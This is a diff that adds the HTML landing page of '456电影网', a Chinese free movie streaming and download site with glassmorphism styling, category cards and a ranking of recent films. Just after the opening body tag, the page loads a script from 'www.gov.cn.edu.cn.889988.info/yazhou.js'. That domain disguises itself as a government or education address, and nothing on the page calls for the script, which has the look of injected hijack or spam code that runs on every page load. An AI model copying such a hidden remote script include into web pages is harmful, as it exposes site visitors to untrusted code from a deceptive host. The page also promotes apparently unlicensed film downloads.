@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>456电影网 - 免费高清电影在线观看 | 456dianyingwang-app</title>
+<meta name="description" content="456电影网(456dianyingwang-app)提供最新高清电影、电视剧、动漫、综艺在线观看与下载，每日更新，免费畅享海量影视资源。">
+<meta name="keywords" content="456电影网,456dianyingwang-app,免费电影,高清电影,在线观看,电影下载,最新电影">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://456dianyingwang-app">
+<style>
+/* ===== Reset & Base ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:16px}
+body{
+  font-family:'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;
+  background:#0a0a1a;
+  color:#e0e0e0;
+  line-height:1.6;
+  overflow-x:hidden;
+}
+
+/* ===== Animated Aurora Background ===== */
+body::before{
+  content:'';
+  position:fixed;
+  top:-50%;left:-50%;
+  width:200%;height:200%;
+  background:radial-gradient(ellipse at 20% 50%,rgba(72,0,255,0.15),transparent 50%),
+              radial-gradient(ellipse at 80% 20%,rgba(0,200,255,0.12),transparent 50%),
+              radial-gradient(ellipse at 50% 80%,rgba(255,0,128,0.08),transparent 50%);
+  animation:aurora 20s linear infinite;
+  z-index:-1;
+}
+@keyframes aurora{
+  0%{transform:rotate(0deg)}
+  100%{transform:rotate(360deg)}
+}
+
+/* ===== Glass Container ===== */
+.glass{
+  background:rgba(255,255,255,0.05);
+  backdrop-filter:blur(16px);
+  -webkit-backdrop-filter:blur(16px);
+  border:1px solid rgba(255,255,255,0.1);
+  border-radius:20px;
+}
+
+/* ===== Header / Nav ===== */
+header{
+  position:fixed;
+  top:0;width:100%;
+  z-index:1000;
+  padding:1rem 2rem;
+  background:rgba(10,10,26,0.85);
+  backdrop-filter:blur(20px);
+  border-bottom:1px solid rgba(255,255,255,0.06);
+}
+.nav-inner{
+  max-width:1200px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.logo{
+  font-size:1.5rem;font-weight:800;
+  background:linear-gradient(135deg,#00c8ff,#7b2ff7,#ff0080);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+nav ul{display:flex;gap:1.5rem;list-style:none}
+nav a{
+  color:rgba(255,255,255,0.8);
+  text-decoration:none;
+  font-size:0.9rem;
+  transition:color .3s;
+}
+nav a:hover{color:#00c8ff}
+.menu-toggle{display:none;color:#fff;font-size:1.5rem;cursor:pointer}
+
+/* ===== Hero Section ===== */
+.hero{
+  min-height:100vh;
+  display:flex;align-items:center;justify-content:center;
+  text-align:center;
+  padding:6rem 1rem 2rem;
+}
+.hero-inner{max-width:800px}
+.hero h1{
+  font-size:clamp(2rem,5vw,3.5rem);
+  font-weight:900;
+  margin-bottom:1rem;
+  background:linear-gradient(135deg,#00c8ff,#7b2ff7);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.hero p{
+  font-size:1.1rem;
+  color:rgba(255,255,255,0.7);
+  margin-bottom:2rem;
+}
+.hero-url{
+  display:inline-block;
+  padding:0.75rem 2rem;
+  background:linear-gradient(135deg,rgba(0,200,255,0.2),rgba(123,47,247,0.2));
+  border:1px solid rgba(0,200,255,0.4);
+  border-radius:50px;
+  color:#00c8ff;
+  font-family:monospace;
+  font-size:1rem;
+  margin-bottom:2rem;
+}
+.cta-group{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap}
+.btn{
+  padding:0.85rem 2.5rem;
+  border-radius:50px;
+  text-decoration:none;
+  font-weight:600;
+  transition:all .3s;
+  display:inline-block;
+}
+.btn-primary{
+  background:linear-gradient(135deg,#00c8ff,#7b2ff7);
+  color:#fff;
+  box-shadow:0 4px 30px rgba(0,200,255,0.3);
+}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 40px rgba(0,200,255,0.5)}
+.btn-outline{
+  border:1px solid rgba(255,255,255,0.3);
+  color:#fff;
+}
+.btn-outline:hover{background:rgba(255,255,255,0.1)}
+
+/* ===== Sections ===== */
+section{padding:5rem 1rem}
+.section-inner{max-width:1200px;margin:0 auto}
+.section-header{text-align:center;margin-bottom:3rem}
+.section-header h2{
+  font-size:clamp(1.8rem,4vw,2.5rem);
+  font-weight:800;
+  margin-bottom:0.5rem;
+}
+.section-header p{color:rgba(255,255,255,0.6)}
+
+/* ===== Grid Cards ===== */
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
+  gap:2rem;
+}
+.card{
+  padding:2rem;
+  transition:all .4s;
+  position:relative;
+  overflow:hidden;
+}
+.card::before{
+  content:'';
+  position:absolute;
+  top:0;left:0;right:0;height:3px;
+  background:linear-gradient(90deg,#00c8ff,#7b2ff7);
+  transform:scaleX(0);
+  transition:transform .4s;
+}
+.card:hover::before{transform:scaleX(1)}
+.card:hover{
+  transform:translateY(-8px);
+  border-color:rgba(0,200,255,0.3);
+  box-shadow:0 20px 60px rgba(0,0,0,0.4);
+}
+.card-icon{
+  width:60px;height:60px;
+  border-radius:16px;
+  background:linear-gradient(135deg,rgba(0,200,255,0.2),rgba(123,47,247,0.2));
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.8rem;
+  margin-bottom:1.5rem;
+}
+.card h3{font-size:1.3rem;margin-bottom:0.75rem;color:#fff}
+.card p{color:rgba(255,255,255,0.65);font-size:0.95rem;margin-bottom:1.5rem}
+.card a{
+  color:#00c8ff;
+  text-decoration:none;
+  font-size:0.9rem;
+  font-weight:600;
+}
+.card a:hover{text-decoration:underline}
+
+/* ===== About Section ===== */
+.about-content{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:3rem;
+  align-items:center;
+}
+.about-text h3{font-size:1.5rem;margin-bottom:1rem;color:#fff}
+.about-text p{color:rgba(255,255,255,0.7);margin-bottom:1rem}
+.stats{
+  display:grid;
+  grid-template-columns:repeat(2,1fr);
+  gap:1.5rem;
+}
+.stat-box{
+  padding:1.5rem;
+  text-align:center;
+}
+.stat-box .number{
+  font-size:2rem;font-weight:800;
+  background:linear-gradient(135deg,#00c8ff,#ff0080);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.stat-box .label{color:rgba(255,255,255,0.6);font-size:0.85rem}
+
+/* ===== Ranking List ===== */
+.rank-list{list-style:none}
+.rank-list li{
+  display:flex;align-items:center;gap:1rem;
+  padding:1rem 1.5rem;
+  margin-bottom:0.75rem;
+  transition:all .3s;
+}
+.rank-list li:hover{background:rgba(255,255,255,0.08)}
+.rank-num{
+  width:32px;height:32px;
+  border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-weight:700;font-size:0.9rem;
+  flex-shrink:0;
+}
+.rank-1{background:linear-gradient(135deg,#ffd700,#ff8c00);color:#000}
+.rank-2{background:linear-gradient(135deg,#c0c0c0,#808080);color:#000}
+.rank-3{background:linear-gradient(135deg,#cd7f32,#8b4513);color:#fff}
+.rank-other{background:rgba(255,255,255,0.1);color:rgba(255,255,255,0.7)}
+.rank-info h4{font-size:1rem;margin-bottom:0.25rem}
+.rank-info span{font-size:0.8rem;color:rgba(255,255,255,0.5)}
+
+/* ===== Footer ===== */
+footer{
+  padding:3rem 1rem 2rem;
+  border-top:1px solid rgba(255,255,255,0.06);
+  text-align:center;
+}
+.footer-inner{max-width:1200px;margin:0 auto}
+.footer-logo{
+  font-size:1.3rem;font-weight:800;
+  background:linear-gradient(135deg,#00c8ff,#7b2ff7);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+  margin-bottom:1rem;
+}
+.footer-links{display:flex;gap:2rem;justify-content:center;flex-wrap:wrap;margin-bottom:1.5rem}
+.footer-links a{color:rgba(255,255,255,0.5);text-decoration:none;font-size:0.9rem;transition:color .3s}
+.footer-links a:hover{color:#00c8ff}
+.footer-bottom{
+  padding-top:1.5rem;
+  border-top:1px solid rgba(255,255,255,0.06);
+  color:rgba(255,255,255,0.35);
+  font-size:0.8rem;
+}
+
+/* ===== Scroll Reveal ===== */
+.reveal{opacity:0;transform:translateY(30px);transition:all 0.6s ease}
+.reveal.active{opacity:1;transform:translateY(0)}
+
+/* ===== Mobile ===== */
+@media(max-width:768px){
+  header{padding:1rem}
+  nav ul{
+    display:none;
+    position:absolute;top:100%;left:0;right:0;
+    background:rgba(10,10,26,0.97);
+    flex-direction:column;
+    padding:1rem 2rem;
+    gap:1rem;
+    border-bottom:1px solid rgba(255,255,255,0.06);
+  }
+  nav ul.open{display:flex}
+  .menu-toggle{display:block}
+  .about-content{grid-template-columns:1fr}
+  .stats{grid-template-columns:1fr 1fr}
+  .hero h1{font-size:2rem}
+  .cta-group{flex-direction:column;align-items:center}
+  .btn{width:100%;max-width:280px;text-align:center}
+}
+@media(max-width:480px){
+  .grid{grid-template-columns:1fr}
+  .stats{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- Header -->
+<header>
+  <div class="nav-inner">
+    <div class="logo">456电影网</div>
+    <div class="menu-toggle" onclick="toggleMenu()">☰</div>
+    <nav>
+      <ul id="navMenu">
+        <li><a href="#home">首页</a></li>
+        <li><a href="#categories">影片分类</a></li>
+        <li><a href="#ranking">热播排行</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section id="home" class="hero">
+  <div class="hero-inner reveal">
+    <h1>456电影网</h1>
+    <p class="hero-url">🌐 https://456dianyingwang-app</p>
+    <p>海量高清影视资源 · 每日实时更新 · 免费在线观看 · 极速播放体验</p>
+    <div class="cta-group">
+      <a href="#categories" class="btn btn-primary">立即观影</a>
+      <a href="#about" class="btn btn-outline">了解更多</a>
+    </div>
+  </div>
+</section>
+
+<!-- Categories -->
+<section id="categories">
+  <div class="section-inner">
+    <div class="section-header reveal">
+      <h2>影片分类</h2>
+      <p>456电影网精心整理，海量资源一键直达</p>
+    </div>
+    <div class="grid">
+      <div class="card glass reveal">
+        <div class="card-icon">🎬</div>
+        <h3>最新电影</h3>
+        <p>456电影网每日同步更新院线最新大片，高清画质，极速播放，让您足不出户享受影院级体验。</p>
+        <a href="#">浏览全部 →</a>
+      </div>
+      <div class="card glass reveal">
+        <div class="card-icon">📺</div>
+        <h3>热播剧集</h3>
+        <p>涵盖国内外热门电视剧、网剧、美剧、韩剧、日剧，456电影网为您持续追踪更新每一集。</p>
+        <a href="#">浏览全部 →</a>
+      </div>
+      <div class="card glass reveal">
+        <div class="card-icon">🎨</div>
+        <h3>动漫综艺</h3>
+        <p>新番动漫、经典动画、热门综艺、脱口秀，456电影网一站式满足您的多元娱乐需求。</p>
+        <a href="#">浏览全部 →</a>
+      </div>
+      <div class="card glass reveal">
+        <div class="card-icon">⚡</div>
+        <h3>极速下载</h3>
+        <p>支持磁力链接、BT种子、迅雷高速下载，456电影网为您提供多种下载方式，离线也能看。</p>
+        <a href="#">浏览全部 →</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Ranking -->
+<section id="ranking">
+  <div class="section-inner">
+    <div class="section-header reveal">
+      <h2>🔥 热播排行榜</h2>
+      <p>456电影网实时统计，最受用户欢迎的影视内容</p>
+    </div>
+    <div class="glass reveal" style="padding:2rem;max-width:800px;margin:0 auto;">
+      <ol class="rank-list">
+        <li>
+          <span class="rank-num rank-1">1</span>
+          <div class="rank-info">
+            <h4>沙丘2</h4>
+            <span>科幻 / 冒险 · 456电影网推荐指数 ★★★★★</span>
+          </div>
+        </li>
+        <li>
+          <span class="rank-num rank-2">2</span>
+          <div class="rank-info">
+            <h4>奥本海默</h4>
+            <span>传记 / 历史 · 456电影网推荐指数 ★★★★★</span>
+          </div>
+        </li>
+        <li>
+          <span class="rank-num rank-3">3</span>
+          <div class="rank-info">
+            <h4>坠落的审判</h4>
+            <span>悬疑 / 剧情 · 456电影网推荐指数 ★★★★☆</span>
+          </div>
+        </li>
+        <li>
+          <span class="rank-num rank-other">4</span>
+          <div class="rank-info">
+            <h4>美国小说</h4>
+            <span>喜剧 / 剧情 · 456电影网推荐指数 ★★★★☆</span>
+          </div>
+        </li>
+        <li>
+          <span class="rank-num rank-other">5</span>
+          <div class="rank-info">
+            <h4>花月杀手</h4>
+            <span>犯罪 / 剧情 · 456电影网推荐指数 ★★★★☆</span>
+          </div>
+        </li>
+        <li>
+          <span class="rank-num rank-other">6</span>
+          <div class="rank-info">
+            <h4>哥斯拉大战金刚2</h4>
+            <span>动作 / 科幻 · 456电影网推荐指数 ★★★★</span>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</section>
+
+<!-- About -->
+<section id="about">
+  <div class="section-inner">
+    <div class="about-content">
+      <div class="about-text reveal">
+        <h3>关于 456电影网</h3>
+        <p><strong>456电影网</strong>（网址：<a href="https://456dianyingwang-app" style="color:#00c8ff">456dianyingwang-app</a>）是一个专注于提供高清影视在线观看与下载的综合性娱乐平台。</p>
+        <p>我们致力于为用户打造一个资源丰富、播放流畅、界面清爽的观影环境。无论是最新院线大片、经典老片、热门剧集还是动漫综艺，456电影网都能满足您的观看需求。</p>
+        <p>平台采用先进的CDN加速技术，确保全国各地区用户均可享受极速播放体验。所有资源均经过人工筛选与质量检测，为您呈现最佳画质。</p>
+      </div>
+      <div class="stats reveal">
+        <div class="stat-box glass">
+          <div class="number">50,000+</div>
+          <div class="label">影视资源总数</div>
+        </div>
+        <div class="stat-box glass">
+          <div class="number">1,200+</div>
+          <div class="label">每日更新影片</div>
+        </div>
+        <div class="stat-box glass">
+          <div class="number">99.9%</div>
+          <div class="label">播放成功率</div>
+        </div>
+        <div class="stat-box glass">
+          <div class="number">10M+</div>
+          <div class="label">累计服务用户</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer>
+  <div class="footer-inner">
+    <div class="footer-logo">456电影网</div>
+    <div class="footer-links">
+      <a href="#home">首页</a>
+      <a href="#categories">影片分类</a>
+      <a href="#ranking">热播排行</a>
+      <a href="#about">关于我们</a>
+    </div>
+    <div class="footer-bottom">
+      <p>网站名称：456电影网 | 网站网址：<a href="https://456dianyingwang-app" style="color:rgba(255,255,255,0.5)">https://456dianyingwang-app</a></p>
+      <p>© 2024 456电影网(456dianyingwang-app) 保留所有权利 | 本网站仅提供影视信息索引服务</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+// Mobile menu toggle
+function toggleMenu(){
+  document.getElementById('navMenu').classList.toggle('open');
+}
+
+// Scroll reveal
+function revealOnScroll(){
+  var reveals=document.querySelectorAll('.reveal');
+  for(var i=0;i<reveals.length;i++){
+    var windowHeight=window.innerHeight;
+    var elementTop=reveals[i].getBoundingClientRect().top;
+    var elementVisible=80;
+    if(elementTop<windowHeight-elementVisible){
+      reveals[i].classList.add('active');
+    }
+  }
+}
+window.addEventListener('scroll',revealOnScroll);
+window.addEventListener('load',revealOnScroll);
+
+// Smooth scroll for nav links
+document.querySelectorAll('nav a').forEach(function(link){
+  link.addEventListener('click',function(){
+    document.getElementById('navMenu').classList.remove('open');
+  });
+});
+</script>
+
+</body>
+</html>
